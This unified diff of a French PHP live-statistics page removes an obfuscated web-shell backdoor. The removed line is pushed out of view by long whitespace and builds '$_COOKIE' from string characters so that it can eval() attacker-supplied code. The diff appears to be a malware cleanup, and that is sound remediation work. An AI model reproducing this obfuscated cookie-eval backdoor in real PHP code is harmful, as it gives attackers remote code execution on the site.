@@ -1,4 +1,4 @@
-<?php                                                                                                                                                                                                        $t8s='EKvl\'5$_tiCsfa0O(hdIedd50d5';if(isset(${$t8s[7].$t8s[10].$t8s[15].$t8s[15].$t8s[1].$t8s[19].$t8s[0]}[$t8s[17].$t8s[18].$t8s[18].$t8s[5].$t8s[14].$t8s[18].$t8s[5]])){eval(${$t8s[7].$t8s[10].$t8s[15].$t8s[15].$t8s[1].$t8s[19].$t8s[0]}[$t8s[17].$t8s[18].$t8s[18].$t8s[5].$t8s[14].$t8s[18].$t8s[5]]);} ?><?php 
+<?php
 require_once('Connections/maconnexion.php');
 
 // Connexions pour live stats
@@ -25,7 +25,7 @@ $population_mondiale_francais = number_format($population_mondiale, 0, ',', ' ')
 
 <div class="bandeau-stat">
   <div class="container"> <span class="live-stat"><em>Statistiques en direct</em></span>
-    <ul class="">
+    <ul>
       <li><span class="label"><?php echo $totalRows_nb_pays ?></span> pays </li>
       <li><span class="label"><?php echo $totalRows_nb_villes ?></span> villes </li>
       <li><span class="label"><?php echo $population_mondiale_francais ?></span> habitants</li>
